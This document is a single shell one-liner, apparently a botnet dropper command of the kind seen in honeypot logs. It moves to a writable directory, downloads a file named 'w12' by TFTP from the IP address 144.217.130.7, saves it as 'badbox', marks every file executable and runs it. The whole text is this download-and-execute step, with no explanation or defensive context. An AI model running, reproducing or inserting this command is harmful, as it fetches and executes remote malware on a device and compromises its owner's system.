cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 144.217.130.7 -c get w12;cat w12 >badbox;chmod +x *;./badbox
